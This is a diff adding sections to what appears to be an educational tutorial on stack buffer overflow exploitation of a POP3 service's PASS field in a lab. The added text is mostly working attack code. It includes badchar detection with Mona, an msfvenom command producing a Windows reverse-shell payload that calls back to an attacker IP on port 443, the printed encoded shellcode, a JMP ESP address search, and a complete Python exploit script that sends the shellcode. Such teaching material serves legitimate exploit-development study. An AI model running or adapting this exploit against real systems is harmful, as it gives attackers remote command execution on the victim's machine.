@@ -131,7 +131,6 @@ We copy this output and pass it in the script instead of the '*A*', in order to 
 #!/usr/bin/python3
 
 import socket
-import sys
 
 # Global variables
 ip_address = "192.168.50.167"
@@ -152,7 +151,6 @@ def exploit():
     s.send(b"USER loki" + b'\r\n')
     response = s.recv(1024)
 
-    # We will send the 'A' char X times to parameter PASS
     s.send(b"PASS " + payload + b'\r\n')
     s.close()
 
@@ -185,7 +183,6 @@ Let's modify the exploit.py script again. This time we know the exact offset bef
 #!/usr/bin/python3
 
 import socket
-import sys
 
 # Global variables
 ip_address = "192.168.50.167"
@@ -210,7 +207,6 @@ def exploit():
     s.send(b"USER loki" + b'\r\n')
     response = s.recv(1024)
 
-    # We will send the 'A' char X times to parameter PASS
     s.send(b"PASS " + payload + b'\r\n')
     s.close()
 
@@ -227,3 +223,363 @@ python3 exploit.py
 As we can see, we have succeeded in making the *EIP* value *42424242*.
 
 At this point we already have *control of the EIP*, since as an attacker we can show the *address we want* in the *EIP*.
+
+## Shellcode space allocation
+
+Once the *offset* has been found and the value of the *EIP* register has been overwritten in a buffer overflow, the next step is to identify where in memory the characters entered in the input field are being represented.
+
+After overwriting the value of the *EIP* register, any additional characters that we introduce in the input field, we will see from *Immunity Debugger* that in this particular case they will be represented at the beginning of the *stack* in the *ESP* (*Extended Stack Pointer*) register. The *ESP* (Extended Stack Pointer) is a CPU register that is used to manage the stack in a program. The stack is a temporary memory area that is used to store values and *return addresses* of functions as they are called in the program.
+
+Once the location of the characters in memory has been identified, the main idea at this point is to insert a *shellcode* in that location, which are low-level instructions which in this case will correspond to a malicious instruction.
+
+The shellcode is inserted on the stack and placed at the same memory address where the overwritten characters were placed. In other words, the buffer overflow is exploited to execute the malicious shellcode and take control of the system.
+
+It is important to note that the shellcode must be carefully designed to avoid being detected as a malicious program, and must be compatible with the CPU architecture and operating system being attacked.
+
+In short, allocating space for the shellcode involves identifying the location in memory where the overwritten characters were placed in the buffer overflow and placing the malicious shellcode there. However, not all characters in the shellcode can be interpreted. In the section we will see how to detect these *badchars* and how to generate a shellcode that does not have these characters.
+
+----
+
+To assign the corresponding space for the Shellcode we will modify the script once more:
+
+```python
+#!/usr/bin/python3
+
+import socket
+
+# Global variables
+ip_address = "192.168.50.167"
+port = 110
+offset = 4654
+
+before_eip = b"A"*offset
+eip = b"B"*4
+after_eip = b"C"*200
+
+payload = before_eip + eip + after_eip
+
+def exploit():
+    # Create a socket
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+    # Connect to the server
+    s.connect((ip_address, port))
+
+    # Receive the banner
+    banner = s.recv(1024)
+
+    s.send(b"USER loki" + b'\r\n')
+    response = s.recv(1024)
+
+    s.send(b"PASS " + payload + b'\r\n')
+    s.close()
+
+if __name__ == '__main__':
+    exploit()
+```
+
+## Generation of Bytearrays and detection of Badchars
+
+In the generation of our malicious shellcode for buffer overflow exploitation, some characters may not be interpreted correctly by the target program. These characters are known as "*badchars*" and can cause the shellcode to crash or the target program to close unexpectedly.
+
+To avoid this, it is important to identify and remove badchars from the shellcode. We will see how from Immunity Debugger we will be able to take advantage of the *Mona* functionality to generate different bytearrays with almost all characters represented, and then identify the characters that the target program fails to interpret.
+
+Once the badchars are identified, they can be discarded from the final shellcode and generate a new shellcode that does not contain these characters. To identify the badchars, different techniques can be used, such as the introduction of different bytearrays with consecutive hexadecimal characters, which make it possible to identify the characters that the target program fails to interpret.
+
+These characters will be represented in the stack (*ESP*), where we will see which characters are not being represented, thus identifying the badchars.
+
+----
+
+First we will use the following command to create our working directory with the *Mona* utility:
+
+```bash
+!mona config -set workingfolder C:\Users\Loki\Desktop\Analysis
+```
+
+Then we are going to generate a combination of all possible characters and we are going to move the *bytearray.txt* that we have generated to our machine. To do this we must create with *impacket-smbserver* a network resource called *smbFolder* that is synchronized with the current working directory and we will give support for version 2 of smb because sometimes *Windows* requires it:
+
+```bash
+impacket-smbserver smbFolder $(pwd) -smb2support
+```
+
+To access the resource from *Windows*, we must open the *file explorer* and go to the following path:
+
+```bash
+# This is our attacker IP
+\\192.168.50.172\smbFolder
+```
+
+Now we are going to modify again the *exploit.py* script, adding in the payload all the hexadecimal values of the *bytearray.txt* file:
+
+```python
+#!/usr/bin/python3
+
+import socket
+
+# Global variables
+ip_address = "192.168.50.167"
+port = 110
+offset = 4654
+
+before_eip = b"A"*offset
+eip = b"B"*4
+
+# ESP
+after_eip = (b"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
+b"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
+b"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
+b"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
+b"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
+b"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
+b"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
+b"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
+
+payload = before_eip + eip + after_eip
+
+def exploit():
+    # Create a socket
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+    # Connect to the server
+    s.connect((ip_address, port))
+
+    # Receive the banner
+    banner = s.recv(1024)
+
+    s.send(b"USER loki" + b'\r\n')
+    response = s.recv(1024)
+
+    s.send(b"PASS " + payload + b'\r\n')
+    s.close()
+
+if __name__ == '__main__':
+    exploit()
+```
+
+When we execute the script and the application has crashed, we will go to *Immunity Debugger* and select the *ESP* in the registry, we will right click and select the option *follow in dump*, which will take us to the *registry* corresponding to the payload that we have introduced (after the *EIP*).
+
+Now the task that we have is to see which characters are *invalid* for the application, for it we can see the missing characters in the *hex dump* or we can use the following command of *Mona* to see the next value that fails:
+
+```bash
+# Here we are comparing the value of the ESP and compare it with the generated bytearray.bin file, then it will give us the failing character
+!mona compare -a 0xDIRECCIONDELESP -f C:\Users\Loki\Desktop\Analysis\bytearray.bin
+
+# Output
+0x00
+```
+
+In this case we see that the character that fails is *00*, so we must exclude it from the list. To do this we are going to generate a new list *excluding* that *character*:
+
+```bash
+!mona bytearray -cpb '\x00'
+```
+
+If we modify our script again with these last values and check again with *Mona* the invalid characters, we will see that now the one that fails is *0a*, so we must *exclude* it too:
+
+```bash
+!mona bytearray -cpb '\x00\x0a'
+```
+
+We must do this constantly until *Mona* indicates that there is no more *BadChar*.
+
+These are the final characters to be excluded in this case:
+
+```bash
+!mona bytearray -cpb '\x00\x0a\x0d'
+```
+
+And this is how the script will look like with all the *valid characters*:
+
+```python
+#!/usr/bin/python3
+
+import socket
+
+# Global variables
+ip_address = "192.168.50.167"
+port = 110
+offset = 4654
+
+before_eip = b"A"*offset
+eip = b"B"*4
+
+# ESP
+after_eip = (b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
+b"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
+b"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
+b"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
+b"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
+b"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
+b"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
+b"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
+
+payload = before_eip + eip + after_eip
+
+def exploit():
+    # Create a socket
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+    # Connect to the server
+    s.connect((ip_address, port))
+
+    # Receive the banner
+    banner = s.recv(1024)
+
+    s.send(b"USER loki" + b'\r\n')
+    response = s.recv(1024)
+
+    s.send(b"PASS " + payload + b'\r\n')
+    s.close()
+
+if __name__ == '__main__':
+    exploit()
+```
+
+Now we can generate a *shellcode* that we are interested in without those characters that the program does not like.
+
+## OpCodes search to enter the ESP and load our Shellcode
+
+Once the malicious *shellcode* has been generated and the badchars have been detected, the next step is to make the program flow into the shellcode so that it can be interpreted. The idea is to make the EIP register point to a memory address where an *opcode* is applied that makes a jump to the *ESP* register (*JMP ESP*), which is where the shellcode is located. This is because we cannot make the EIP point directly to our shellcode in the first place.
+
+To find the *JMP ESP* opcode, you can use different tools, such as *mona.py*, which allows you to search for opcodes in specific modules in the target program's memory. Once the '*JMP ESP*' opcode has been found, the value of the EIP register can be overwritten with the memory address where the opcode is located, which will allow jumping to the ESP register and executing the malicious shellcode.
+
+Opcode lookup to enter the ESP register and load the shellcode is a technique used to make the program flow into the shellcode to be interpreted. The JMP ESP opcode is used to jump to the memory address of the ESP register, where the shellcode is located.
+
+----
+
+To generate the *shellcode* we can do it with the **msfvenom** tool:
+
+```bash
+# EXITFUNC=thread is so that if the service crashes, we don't lose the shell since we have it in another thread
+msfvenom -p windows/shell_reverse_tcp --platform windows -a x86 LHOST=192.168.50.172 LPORT=443 -b '\x00\x0a\x0d' -f c EXITFUNC=thread
+
+# If it does not detect the default shikata_ga_nai encoder, we can specify it with '-e'
+msfvenom -p windows/shell_reverse_tcp --platform windows -a x86 LHOST=192.168.50.172 LPORT=443 -b '\x00\x0a\x0d' -f c -e x86/shikata_ga_nai EXITFUNC=thread
+
+# Output
+"\xbb\xba\x25\x76\x42\xdb\xc0\xd9\x74\x24\xf4\x5a\x29\xc9"
+"\xb1\x52\x83\xc2\x04\x31\x5a\x0e\x03\xe0\x2b\x94\xb7\xe8"
+"\xdc\xda\x38\x10\x1d\xbb\xb1\xf5\x2c\xfb\xa6\x7e\x1e\xcb"
+"\xad\xd2\x93\xa0\xe0\xc6\x20\xc4\x2c\xe9\x81\x63\x0b\xc4"
+"\x12\xdf\x6f\x47\x91\x22\xbc\xa7\xa8\xec\xb1\xa6\xed\x11"
+"\x3b\xfa\xa6\x5e\xee\xea\xc3\x2b\x33\x81\x98\xba\x33\x76"
+"\x68\xbc\x12\x29\xe2\xe7\xb4\xc8\x27\x9c\xfc\xd2\x24\x99"
+"\xb7\x69\x9e\x55\x46\xbb\xee\x96\xe5\x82\xde\x64\xf7\xc3"
+"\xd9\x96\x82\x3d\x1a\x2a\x95\xfa\x60\xf0\x10\x18\xc2\x73"
+"\x82\xc4\xf2\x50\x55\x8f\xf9\x1d\x11\xd7\x1d\xa3\xf6\x6c"
+"\x19\x28\xf9\xa2\xab\x6a\xde\x66\xf7\x29\x7f\x3f\x5d\x9f"
+"\x80\x5f\x3e\x40\x25\x14\xd3\x95\x54\x77\xbc\x5a\x55\x87"
+"\x3c\xf5\xee\xf4\x0e\x5a\x45\x92\x22\x13\x43\x65\x44\x0e"
+"\x33\xf9\xbb\xb1\x44\xd0\x7f\xe5\x14\x4a\xa9\x86\xfe\x8a"
+"\x56\x53\x50\xda\xf8\x0c\x11\x8a\xb8\xfc\xf9\xc0\x36\x22"
+"\x19\xeb\x9c\x4b\xb0\x16\x77\xb4\xed\x2a\x2b\x5c\xec\x4a"
+"\x32\x26\x79\xac\x5e\x48\x2c\x67\xf7\xf1\x75\xf3\x66\xfd"
+"\xa3\x7e\xa8\x75\x40\x7f\x67\x7e\x2d\x93\x10\x8e\x78\xc9"
+"\xb7\x91\x56\x65\x5b\x03\x3d\x75\x12\x38\xea\x22\x73\x8e"
+"\xe3\xa6\x69\xa9\x5d\xd4\x73\x2f\xa5\x5c\xa8\x8c\x28\x5d"
+"\x3d\xa8\x0e\x4d\xfb\x31\x0b\x39\x53\x64\xc5\x97\x15\xde"
+"\xa7\x41\xcc\x8d\x61\x05\x89\xfd\xb1\x53\x96\x2b\x44\xbb"
+"\x27\x82\x11\xc4\x88\x42\x96\xbd\xf4\xf2\x59\x14\xbd\x13"
+"\xb8\xbc\xc8\xbb\x65\x55\x71\xa6\x95\x80\xb6\xdf\x15\x20"
+"\x47\x24\x05\x41\x42\x60\x81\xba\x3e\xf9\x64\xbc\xed\xfa"
+"\xac"
+```
+
+Now we must modify the *exploit.py* script to include our *shellcode*, adding the above output.
+
+Before that, we also have to keep in mind that the *EIP* currently *points to 42424242* (*BBBB*), but we have to try to *point it to the stack* because that is where our *shellcode* will be hosted. Since we can't tell the *EIP* where to point, we have to try to find an *opcode* that performs the jump to the *ESP* (*JMP ESP*). For this we are going to use *Mona*:
+
+```bash
+!mona modules
+```
+
+We have to find a *module* that is running that has all the *protections disabled* (*False*). One of these modules would be, for example, *SLMFC.DLL*. For this we first have to know which is the *opcode* corresponding to *JMP ESP*, for this we can use the *nasm_shell* tool:
+
+```bash
+/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
+
+# If we enter 'JMP ESP' the output will be 'FFE4', which translates to '\xFF\xE4'.
+```
+
+Now we can use *Mona* to search for the *JMP ESP* opcode and the *SLMFC.DLL* module we obtained earlier:
+
+```bash
+!mona find -s "\xFF\xE4" -m SLMFC.DLL
+```
+
+We have to take any *address* that does *not contain the badchars* that we have detected before and we copy it with right click. In this case I have taken the *0x5f4a358f*.
+
+The *address* that we obtained previously will be the *EIP* to which we will point in our *exploit.py*, but being a *32-bit system* we must represent it in *little endian*:
+
+```python
+#!/usr/bin/python3
+
+import socket
+from struct import pack
+
+# Global variables
+ip_address = "192.168.50.167"
+port = 110
+offset = 4654
+
+before_eip = b"A"*offset
+# We must make sure that the address is in lower case
+eip = pack("<L", 0x5f4a358f)
+shell_code = (b"\xbb\xba\x25\x76\x42\xdb\xc0\xd9\x74\x24\xf4\x5a\x29\xc9"
+b"\xb1\x52\x83\xc2\x04\x31\x5a\x0e\x03\xe0\x2b\x94\xb7\xe8"
+b"\xdc\xda\x38\x10\x1d\xbb\xb1\xf5\x2c\xfb\xa6\x7e\x1e\xcb"
+b"\xad\xd2\x93\xa0\xe0\xc6\x20\xc4\x2c\xe9\x81\x63\x0b\xc4"
+b"\x12\xdf\x6f\x47\x91\x22\xbc\xa7\xa8\xec\xb1\xa6\xed\x11"
+b"\x3b\xfa\xa6\x5e\xee\xea\xc3\x2b\x33\x81\x98\xba\x33\x76"
+b"\x68\xbc\x12\x29\xe2\xe7\xb4\xc8\x27\x9c\xfc\xd2\x24\x99"
+b"\xb7\x69\x9e\x55\x46\xbb\xee\x96\xe5\x82\xde\x64\xf7\xc3"
+b"\xd9\x96\x82\x3d\x1a\x2a\x95\xfa\x60\xf0\x10\x18\xc2\x73"
+b"\x82\xc4\xf2\x50\x55\x8f\xf9\x1d\x11\xd7\x1d\xa3\xf6\x6c"
+b"\x19\x28\xf9\xa2\xab\x6a\xde\x66\xf7\x29\x7f\x3f\x5d\x9f"
+b"\x80\x5f\x3e\x40\x25\x14\xd3\x95\x54\x77\xbc\x5a\x55\x87"
+b"\x3c\xf5\xee\xf4\x0e\x5a\x45\x92\x22\x13\x43\x65\x44\x0e"
+b"\x33\xf9\xbb\xb1\x44\xd0\x7f\xe5\x14\x4a\xa9\x86\xfe\x8a"
+b"\x56\x53\x50\xda\xf8\x0c\x11\x8a\xb8\xfc\xf9\xc0\x36\x22"
+b"\x19\xeb\x9c\x4b\xb0\x16\x77\xb4\xed\x2a\x2b\x5c\xec\x4a"
+b"\x32\x26\x79\xac\x5e\x48\x2c\x67\xf7\xf1\x75\xf3\x66\xfd"
+b"\xa3\x7e\xa8\x75\x40\x7f\x67\x7e\x2d\x93\x10\x8e\x78\xc9"
+b"\xb7\x91\x56\x65\x5b\x03\x3d\x75\x12\x38\xea\x22\x73\x8e"
+b"\xe3\xa6\x69\xa9\x5d\xd4\x73\x2f\xa5\x5c\xa8\x8c\x28\x5d"
+b"\x3d\xa8\x0e\x4d\xfb\x31\x0b\x39\x53\x64\xc5\x97\x15\xde"
+b"\xa7\x41\xcc\x8d\x61\x05\x89\xfd\xb1\x53\x96\x2b\x44\xbb"
+b"\x27\x82\x11\xc4\x88\x42\x96\xbd\xf4\xf2\x59\x14\xbd\x13"
+b"\xb8\xbc\xc8\xbb\x65\x55\x71\xa6\x95\x80\xb6\xdf\x15\x20"
+b"\x47\x24\x05\x41\x42\x60\x81\xba\x3e\xf9\x64\xbc\xed\xfa"
+b"\xac")
+
+payload = before_eip + eip + shell_code
+
+def exploit():
+    # Create a socket
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+    # Connect to the server
+    s.connect((ip_address, port))
+
+    # Receive the banner
+    banner = s.recv(1024)
+
+    s.send(b"USER loki" + b'\r\n')
+    response = s.recv(1024)
+
+    s.send(b"PASS " + payload + b'\r\n')
+    s.close()
+
+if __name__ == '__main__':
+    exploit()
+```
+
+To check if the *address* we have entered in the *EIP* contains the *JMP ESP* instruction, we can hit play and *debug* the code. To do this we can click on the arrow to the right that when hovering over it shows us "*Go to address*" and look for the previous address until we see that it includes *JMP ESP*.
+
+Now we can make right click and put a *breakpoint* so that the code stops when it passes there.
+
+When we execute the script, if everything has gone well, in the point where the breakpoint is the value of the *EIP should point to the address that we put before*, which means that the *following thing* that is going to be executed is the *JMP ESP*.
+
+If we click on "*Step into*" we can see that the *ESP* value is now the same as the *EIP*, this is because *EIP* is going to point to the *ESP* in the next step.
+
+Right now the *shellcode* will not be interpreted, we have to give it a *space*. We will see this in the next section.
